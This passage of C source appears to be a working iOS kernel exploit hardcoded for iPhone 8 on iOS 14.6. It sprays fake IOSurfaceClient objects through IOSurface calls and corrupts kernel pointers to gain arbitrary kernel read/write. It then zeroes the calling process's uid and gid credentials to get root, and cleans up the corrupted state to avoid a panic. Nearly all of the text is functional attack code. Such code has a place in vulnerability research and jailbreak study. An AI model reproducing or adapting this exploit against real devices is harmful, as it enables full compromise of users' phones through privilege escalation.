            *(uint64_t *)(fake_IOSurfaceClient + 0x40) = GUESSED_SHMEM_PTR + STAGE2_FAKE_SURFACE_OFF;

            uint8_t *fake_IOSurface = g_shmem_page + STAGE2_FAKE_SURFACE_OFF;
            memset(fake_IOSurface, 0, 0x400);

            /* Again, nonsense vtab */
            *(uint64_t *)fake_IOSurface = 0x0202020202020202;

            /* IOSurfaceRootUserClient::s_get_surface_use_count will give us
             * *(uint32_t *)(*(uint64_t *)(fake_IOSurface + 0xc0) + 0x14),
             * so we use that to figure out which IOSurfaceClient pointer was
             * incremented into our OSData later */
            *(uint64_t *)(fake_IOSurface + 0xc0) = GUESSED_SHMEM_PTR + STAGE2_SURFACE_USE_COUNT_OFF;

            *(uint32_t *)(g_shmem_page + STAGE2_SURFACE_USE_COUNT_OFF + 0x14) = STAGE2_FAKE_SURFACE_USE_COUNT;

            /* kext.kalloc.160 chunk size is only one page, with 0x40 bytes
             * left over at the end of the page, so we don't lay the fake
             * IOSurfaceClients contiguously out on both pages */
            uint8_t *cursor = spray->osdata_spray;
            uint8_t *end = spray->osdata_spray + 0x3fc0;

            while(cursor < end){
                memcpy(cursor, fake_IOSurfaceClient, sizeof(fake_IOSurfaceClient));
                cursor += sizeof(fake_IOSurfaceClient);
            }

            cursor = spray->osdata_spray + 0x4000;
            end = spray->osdata_spray + 0x4000 + 0x3fc0;

            while(cursor < end){
                memcpy(cursor, fake_IOSurfaceClient, sizeof(fake_IOSurfaceClient));
                cursor += sizeof(fake_IOSurfaceClient);
            }

            uint32_t out = 0;
            size_t outsz = sizeof(out);

            kern_return_t kret = IOConnectCallStructMethod(iosruc, 9, spray,
                    sizeof(*spray) + osdata_spray_sz, &out, &outsz);

            if(kret){
                printf("%s: OSData spray failed at %d: %s\n", __func__, i,
                        mach_error_string(kret));
                return false;
            }
        }
    }

    /* Now do the IOSurfaceClient pointer increment. We increment the
     * upper 32 bits of a pointer four times so it points into the OSData
     * we just sprayed. If this is successful, we'll control an IOSurface
     * object. We do this four times, each starting on a different page
     * boundary, because we are not sure where the first 0x10000-byte hole
     * was filled */
    uint64_t start = 0xffffffe806000000, end = 0xffffffe807000000;

    /* We'll try and fake whatever the first IOSurface is for the
     * user client we created earlier. The size of the IOSurfaceClient
     * array is 0x10000 bytes */
    uint32_t target_surface = (uint32_t)(uintptr_t)surface_array->items[0];

    printf("%s: target surface is %d\n", __func__, target_surface);

    while(start + 0x10000 < end){
        increment32_n(start + (sizeof(void *) * target_surface) + 4, 4);
        start += 0x10000;
    }

    start = 0xffffffe806004000;

    while(start + 0x10000 < end){
        increment32_n(start + (sizeof(void *) * target_surface) + 4, 4);
        start += 0x10000;
    }

    start = 0xffffffe806008000;

    while(start + 0x10000 < end){
        increment32_n(start + (sizeof(void *) * target_surface) + 4, 4);
        start += 0x10000;
    }

    start = 0xffffffe80600c000;

    while(start + 0x10000 < end){
        increment32_n(start + (sizeof(void *) * target_surface) + 4, 4);
        start += 0x10000;
    }

    /* Now check if we obtained control over target_surface */
    uint64_t in = target_surface;
    uint64_t use_count = 0;
    uint32_t outcnt = 1;

    kern_return_t kret = IOConnectCallScalarMethod(iosruc, 16, &in, 1,
            &use_count, &outcnt);

    if(kret){
        printf("%s: s_get_surface_use_count for surface %d failed: %s\n",
                __func__, target_surface, mach_error_string(kret));
        return false;
    }

    if(use_count != STAGE2_FAKE_SURFACE_USE_COUNT){
        printf("%s: we did not obtain control over IOSurface %d\n",
                __func__, target_surface);
        return false;
    }

    printf("%s: obtained control over IOSurface %d\n", __func__,
            target_surface);

    *krw_iosruc_out = iosruc;
    *krw_surface_id_out = target_surface;
    *krw_surface_mem_out = g_shmem_page + STAGE2_FAKE_SURFACE_OFF;
    *ool_recvs_out = spray_recvs;
    *sprayed_surfaces_out = surface_array;

    return true;
}

/* Kernel read/write constants */
static io_connect_t g_krw_iosruc = IO_OBJECT_NULL;
static uint32_t g_krw_surface_id = 0;
static uint8_t *g_krw_surface_mem = NULL;

static bool init_krw(io_connect_t krw_iosruc,
        uint32_t krw_surface_id, uint8_t *krw_surface_page){
    g_krw_iosruc = krw_iosruc;
    g_krw_surface_id = krw_surface_id;
    g_krw_surface_mem = krw_surface_page;

    return true;
}

static bool kread32(uint64_t kaddr, uint32_t *out){
    if(!g_krw_iosruc){
        printf("%s: init_krw not called yet\n", __func__);
        return false;
    }

    *(uint64_t *)(g_krw_surface_mem + 0xc0) = kaddr - 0x14;

    uint64_t in = g_krw_surface_id;
    uint64_t val = 0;
    uint32_t outcnt = 1;

    kern_return_t kret = IOConnectCallScalarMethod(g_krw_iosruc, 16, &in, 1,
            &val, &outcnt);

    if(kret){
        printf("%s: failed reading from %#llx: %s\n", __func__,
                kaddr, mach_error_string(kret));
        return false;
    }

    *out = (uint32_t)val;

    return true;
}

static bool kread64(uint64_t kaddr, uint64_t *out){
    uint32_t low, high;

    if(!kread32(kaddr, &low))
        return false;

    if(!kread32(kaddr + sizeof(uint32_t), &high))
        return false;

    *out = ((uint64_t)high << 32) | low;

    return true;
}

static bool kwrite32(uint64_t kaddr, uint32_t val){
    if(!g_krw_iosruc){
        printf("%s: init_krw not called yet\n", __func__);
        return false;
    }

    *(uint32_t *)(g_krw_surface_mem + 0xb0) = 1;
    *(uint64_t *)(g_krw_surface_mem + 0xc0) = kaddr - 0x98;

    uint64_t ins[] = { g_krw_surface_id, 0, val };

    kern_return_t kret = IOConnectCallScalarMethod(g_krw_iosruc, 31,
            ins, 3, NULL, NULL);

    if(kret){
        printf("%s: failed writing to %#llx: %s\n", __func__, kaddr,
                mach_error_string(kret));
        return false;
    }

    return true;
}

static bool kwrite64(uint64_t kaddr, uint64_t val){
    uint32_t low = (uint32_t)val;
    uint32_t high = (uint32_t)(val >> 32);

    if(!kwrite32(kaddr, low))
        return false;

    if(!kwrite32(kaddr + sizeof(uint32_t), high))
        return false;

    return true;
}

/* 1. Zero out all the OOL port pointers in the message carried by
 * every port in ool_recvs since we may have incremented one of those
 * pointers during stage2.
 *
 * 2. Zero out the type-confused IOSurface pointers from the
 * IOSurfaceSendRight ports we produced with increment32_n.
 *
 * 3. Fix up the four IOSurfaceClient pointers to point to what they
 * originally pointed to. */
static bool cleanup(uint64_t mytask, struct array *ool_recvs){
    uint64_t itk_space;

    if(!kread64(mytask + 0x338, &itk_space)){
        printf("%s: failed reading itk_space\n", __func__);
        return false;
    }

    /* I have no idea what is PAC'ed and what isn't */
    itk_space |= 0xffffff8000000000;

    uint64_t is_table;

    if(!kread64(itk_space + 0x20, &is_table)){
        printf("%s: failed reading is_table\n", __func__);
        return false;
    }

    is_table |= 0xffffff8000000000;

    for(int i=0; i<ool_recvs->len; i++){
        mach_port_t ool_recv = (mach_port_t)(uintptr_t)ool_recvs->items[i];

        if(!ool_recv)
            continue;

        uint64_t ool_recv_entry = is_table + (0x18 * (ool_recv >> 8));
        uint64_t ie_object;

        if(!kread64(ool_recv_entry, &ie_object)){
            printf("%s: failed reading ie_object for port %#x\n",
                    __func__, ool_recv);
            return false;
        }

        if(!ie_object){
            printf("%s: ie_object is NULL for port %#x?\n", __func__,
                    ool_recv);
            continue;
        }

        ie_object |= 0xffffff8000000000;

        uint64_t kmsg_base;

        if(!kread64(ie_object + 0x40, &kmsg_base)){
            printf("%s: failed to read out OOL ports msg for port %#x\n",
                    __func__, ool_recv);
            return false;
        }

        if(!kmsg_base){
            printf("%s: no kmsg for port %#x?\n", __func__, ool_recv);
            continue;
        }

        kmsg_base |= 0xffffff8000000000;

        uint64_t ool_ports_array;

        if(!kread64(kmsg_base + 0xac, &ool_ports_array)){
            printf("%s: failed to read ool ports array for port %#x\n",
                    __func__, ool_recv);
            return false;
        }

        /* Each of these messages were 0x10000 bytes, but we only
         * incremented the qword at every page boundary */
        if(!ool_ports_array){
            printf("%s: no OOL ports array for port %#x?\n",
                    __func__, ool_recv);
            continue;
        }

        ool_ports_array |= 0xffffff8000000000;

        uint64_t off = sizeof(void *) * g_krw_surface_id;

        if(!kwrite64(ool_ports_array + off, 0)){
            printf("%s: could not fix ool ports array for port %#x (+0)\n",
                    __func__, ool_recv);
            return false;
        }

        if(!kwrite64(ool_ports_array + 0x4000 + off, 0)){
            printf("%s: could not fix ool ports array for port %#x (+0x4000)\n",
                    __func__, ool_recv);
            return false;
        }

        if(!kwrite64(ool_ports_array + 0x8000 + off, 0)){
            printf("%s: could not fix ool ports array for port %#x (+0x8000)\n",
                    __func__, ool_recv);
            return false;
        }

        if(!kwrite64(ool_ports_array + 0xc000 + off, 0)){
            printf("%s: could not fix ool ports array for port %#x (+0xc000)\n",
                    __func__, ool_recv);
            return false;
        }

        /* Safe to free this OOL ports message now */
        mach_port_destroy(mach_task_self(), ool_recv);
    }

    for(int i=0; i<g_increment32_n_ports->len; i++){
        mach_port_t cport = (mach_port_t)(uintptr_t)g_increment32_n_ports->items[i];

        uint64_t cport_entry = is_table + (0x18 * (cport >> 8));
        uint64_t iossr_port_kaddr;

        if(!kread64(cport_entry, &iossr_port_kaddr)){
            printf("%s: failed reading ie_object for cport %#x\n",
                    __func__, cport);
            return false;
        }

        if(!iossr_port_kaddr){
            printf("%s: ie_object is NULL for port %#x?\n", __func__, cport);
            continue;
        }

        iossr_port_kaddr |= 0xffffff8000000000;

        uint64_t iossr_kaddr;

        if(!kread64(iossr_port_kaddr + 0x68, &iossr_kaddr)){
            printf("%s: failed reading IOSurfaceSendRight kaddr\n", __func__);
            return false;
        }

        iossr_kaddr |= 0xffffff8000000000;

        if(!kwrite64(iossr_kaddr + 0x18, 0)){
            printf("%s: could not zero IOSurface ptr for iossr %#llx\n",
                    __func__, iossr_kaddr);
            return 0;
        }
    }

    uint64_t krw_iosruc_port_ptr = is_table + (0x18 * (g_krw_iosruc >> 8));
    uint64_t krw_iosruc_port_kaddr;

    if(!kread64(krw_iosruc_port_ptr, &krw_iosruc_port_kaddr)){
        printf("%s: failed reading krw iosruc port kaddr\n", __func__);
        return false;
    }

    krw_iosruc_port_ptr |= 0xffffff8000000000;

    uint64_t krw_iosruc_kaddr;

    if(!kread64(krw_iosruc_port_kaddr + 0x68, &krw_iosruc_kaddr)){
        printf("%s: failed reading krw iosruc kaddr\n", __func__);
        return false;
    }

    krw_iosruc_kaddr |= 0xffffff8000000000;

    /* I know this is not PAC'ed */
    uint64_t sc_array;

    if(!kread64(krw_iosruc_kaddr + 0x118, &sc_array)){
        printf("%s: failed reading IOSurfaceClient array\n", __func__);
        return false;
    }

    /* We incremented three other IOSurfaceClient array pointers,
     * so fix those before we free the one we use for kernel read/write */
    uint64_t sc = sc_array + (sizeof(uint64_t) * g_krw_surface_id) + 0xc000;

    for(int i=3; i>=0; i--){
        uint32_t upper;

        if(!kread32(sc + sizeof(uint32_t), &upper)){
            printf("%s: failed reading upper half of sc ptr (%d)\n",
                    __func__, i);
            return false;
        }

        if(!kwrite32(sc + sizeof(uint32_t), upper - 4)){
            printf("%s: failed restoring orig sc ptr (%d)\n",
                    __func__, i);
            return false;
        }

        sc -= 0x4000;
    }

    IOServiceClose(g_krw_iosruc);

    g_krw_iosruc = IO_OBJECT_NULL;
    g_krw_surface_id = 0;
    g_krw_surface_mem = NULL;

    printf("%s: Cleanup successful. r/w primitives are no longer"
            " available\n", __func__);

    return true;
}

static bool post_exploit(uint64_t leaked_kthread, uint64_t *mytaskp){
    /* Offsets hardcoded for iPhone 8, 14.6 */

    uint64_t slid_thread_timer_expire;

    if(!kread64(leaked_kthread + 0x458, &slid_thread_timer_expire)){
        printf("%s: failed reading thread_timer_expire fptr\n", __func__);
        return false;
    }

    /* I don't own any A12+ so I have no idea what's PAC'ed or not */
    slid_thread_timer_expire |= 0xffffff8000000000;

    uint64_t kslide = slid_thread_timer_expire - 0xfffffff007aac5f4;

    printf("%s: kernel slide is %#llx\n", __func__, kslide);

    uint64_t kernel_task;

    if(!kread64(leaked_kthread + 0x3f0, &kernel_task)){
        printf("%s: failed reading kernel_task\n", __func__);
        return false;
    }

    kernel_task |= 0xffffff8000000000;

    printf("%s: kernel task struct is at %#llx\n", __func__, kernel_task);

    uint64_t kernel_proc;

    if(!kread64(kernel_task + 0x398, &kernel_proc)){
        printf("%s: failed reading kernel proc pointer\n", __func__);
        return false;
    }

    kernel_proc |= 0xffffff8000000000;

    printf("%s: kernel proc struct is at %#llx\n", __func__, kernel_proc);

    uint64_t curproc;

    if(!kread64(kernel_proc + 0x8, &curproc)){
        printf("%s: failed kernproc->le_prev\n", __func__);
        return false;
    }

    curproc |= 0xffffff8000000000;

    uint64_t myproc;

    pid_t pid, mypid = getpid();

    do {
        if(!kread32(curproc + 0x68, (uint32_t *)&pid)){
            printf("%s: fail reading pid for proc struct %#llx\n",
                    __func__, curproc);
            return false;
        }

        myproc = curproc;

        if(!kread64(curproc + 0x8, &curproc)){
            printf("%s: failed reading next proc\n", __func__);
            return false;
        }

        curproc |= 0xffffff8000000000;
    } while (pid != mypid);

    printf("%s: my proc struct is at %#llx\n", __func__, myproc);

    uint64_t mytask;

    if(!kread64(myproc + 0x10, &mytask)){
        printf("%s: could not read my task struct\n", __func__);
        return false;
    }

    mytask |= 0xffffff8000000000;

    printf("%s: my task struct is at %#llx\n", __func__, mytask);

    uint64_t mycreds;

    if(!kread64(myproc + 0xf0, &mycreds)){
        printf("%s: could not read my creds struct\n", __func__);
        return false;
    }

    mycreds |= 0xffffff8000000000;

    printf("%s: my creds are at %#llx\n", __func__, mycreds);

    uid_t uid = getuid();
    gid_t gid = getgid();

    printf("%s: before: uid = %d, gid = %d\n", __func__, uid, gid);

    if(!kwrite32(mycreds + 0x18, 0)){
        printf("%s: failed zeroing uid\n", __func__);
        return false;
    }

    if(!kwrite32(mycreds + 0x1c, 0)){
        printf("%s: failed zeroing ruid\n", __func__);
        return false;
    }

    if(!kwrite32(mycreds + 0x20, 0)){
        printf("%s: failed zeroing svuid\n", __func__);
        return false;
    }

    if(!kwrite32(mycreds + 0x68, 0)){
        printf("%s: failed zeroing rgid\n", __func__);
        return false;
    }

    if(!kwrite32(mycreds + 0x6c, 0)){
        printf("%s: failed zeroing svgid\n", __func__);
        return false;
    }

    uid = getuid();
    gid = getgid();

    printf("%s: after: uid = %d, gid = %d\n", __func__, uid, gid);

    *mytaskp = mytask;

    return true;
}

static int kernel_shmem_cmp(const void *_a, const void *_b){
    const uintptr_t a = *(uintptr_t *)_a;
    const uintptr_t b = *(uintptr_t *)_b;

    if(a < b)
        return -1;
    else if(a == b)
        return 0;
    else
        return 1;
}

#ifdef SAMPLING_SHMEM

#define g_kernel_shmem_array_len 30
extern void *g_kernel_shmem[(g_kernel_shmem_array_len*2)+1];

/* For iPhone 8, 14.6, 30 seconds after boot, guess 0xffffffe8c3898000 */

static void sample_memory(void){
    long SYS_xnuspy_ctl;
    size_t oldlen = sizeof(long);
    int res = sysctlbyname("kern.xnuspy_ctl_callnum", &SYS_xnuspy_ctl,
            &oldlen, NULL, 0);

    if(res == -1){
        printf("sysctlbyname with kern.xnuspy_ctl_callnum failed: %s\n",
                strerror(errno));
        return;
    }

    res = syscall(SYS_xnuspy_ctl, XNUSPY_CHECK_IF_PATCHED, 0, 0, 0);

    if(res != 999){
        printf("xnuspy_ctl isn't present?\n");
        return;
    }

    /* iPhone 8, 14.6 */
    res = syscall(SYS_xnuspy_ctl, XNUSPY_INSTALL_HOOK, 0xfffffff009157e90,
            _IOGPUKernelMappedMemory__getKernelData,
            &IOGPUKernelMappedMemory__getKernelData);

    if(res){
        printf("%s: could not hook IOGPUKernelMappedMemory::getKernelData: %s\n",
                __func__, strerror(errno));
        return;
    }

    const int mb = 12;

    create_and_map_shmem(mb * 0x100000);
    create_and_map_shmem(mb * 0x100000);
    create_and_map_shmem(mb * 0x100000);

    printf("%s: for kernel mappings of %d mbs:\n", __func__, mb);

    for(int i=0; i<g_shmem_array->len; i++){
        struct AGXDeviceUserClient_shmem *shmem = g_shmem_array->items[i];

        setup_stage1_shmem((uint8_t *)shmem->shmem_addr,
                shmem->shmem_size);

        printf("%s: %d: [%#llx, %#llx)\n", __func__, shmem->shmem_id,
                shmem->shmem_addr,
                shmem->shmem_addr + shmem->shmem_size);
    }

    struct array *kernel_shmem = array_new();

    for(int i=1; i<7; i++){
        if(g_kernel_shmem[i])
            array_insert(kernel_shmem, g_kernel_shmem[i]);
    }

    array_qsort(kernel_shmem, kernel_shmem_cmp);

    uintptr_t dists[6];

    for(int i=0; i<kernel_shmem->len; i++){
        void *kshmem = kernel_shmem->items[i];

        printf("%s: %p", __func__, kshmem);

        if(i == 0)
            puts("");
        else{
            uintptr_t before = (uintptr_t)kernel_shmem->items[i-1];
            uintptr_t dist = (uintptr_t)kshmem - before;

            dists[i] = dist;

            printf(" [%#lx bytes from behind]\n", dist);
        }
    }

    /* Intentionally starting at one to exclude first allocation */
    for(int i=1; i<6; i++){
        for(int k=1; k<6; k++){
            if(dists[i] != dists[k]){
                printf("%s: ****NOT CONTIGUOUS, not continuing\n", __func__);
                return;
            }
        }
    }

    printf("%s: contiguous! only keeping first & last allocs\n", __func__);
    printf("%s: to add to python3:\n", __func__);

    void *last = kernel_shmem->items[kernel_shmem->len-1];

    printf("[%p, %p],\n", kernel_shmem->items[0],
            (void *)((uintptr_t)last + (mb*0x100000) - 0x4000));
}

#endif /* #ifdef SAMPLING_SHMEM */

static void exploit(io_connect_t iomfbuc){
    uint64_t leaked_kthread, kshmem_page;
    uint8_t *shmem_page;

    /* We pass stage2 results here because the thread used in stage2
     * is also used in stage1 */
    if(!exploit_stage1(iomfbuc, &leaked_kthread, &kshmem_page,
                &shmem_page)){
        printf("%s: stage1 failed\n", __func__);
        return;
    }

    printf("%s: stage1 success:\n"
            "\tleaked kernel thread addr:          %#llx\n"
            "\tconfirmed kernel shmem page:        %#llx\n"
            "\tuserspace page of kshmem page:      %p\n",
            __func__, leaked_kthread, kshmem_page, shmem_page);

    io_connect_t krw_iosruc;
    uint32_t krw_surface_id;
    uint8_t *krw_surface_mem;
    struct array *ool_recvs, *surfaces;

    if(!exploit_stage2(iomfbuc, &krw_iosruc, &krw_surface_id,
                &krw_surface_mem, &ool_recvs, &surfaces)){
        printf("%s: stage2 failed\n", __func__);
        return;
    }

    printf("%s: stage2 success:\n"
           "\tIOSurfaceRootUserClient:          %#x\n"
           "\tcontrolled IOSurface ID:          %d\n"
           "\tcontrolled IOSurface lives at:    %p\n",
           __func__, krw_iosruc, krw_surface_id, krw_surface_mem);


    if(!init_krw(krw_iosruc, krw_surface_id, krw_surface_mem)){
        printf("%s: could not init kernel read/write prims\n", __func__);
        return;
    }

    printf("%s: success\n"
           "   read kernel memory with kread32/64\n"
           "   write kernel memory with kwrite32/64\n", __func__);

    uint64_t mytask;

    if(!post_exploit(leaked_kthread, &mytask)){
        printf("%s: post exploit failed, we will panic\n", __func__);
        return;
    }

    if(!cleanup(mytask, ool_recvs)){
        printf("%s: cleanup failed, we will panic\n", __func__);
        return;
    }

    /* XXX kread32/64 and kwrite32/64 are no longer valid here */

    array_destroy(&ool_recvs);
    array_destroy(&surfaces);
}

int main(int argc, char **argv){
#ifdef SAMPLING_SHMEM
    g_shmem_array = array_new();
    sample_memory();
    return 0;
#endif

    io_connect_t iomfbuc = IOMobileFramebufferUserClient_uc();

    if(!iomfbuc){
        printf("%s: failed getting IOMobileFramebufferUserClient\n", __func__);
        return 1;
    }

    exploit(iomfbuc);

    for(;;);
    return 0;
}
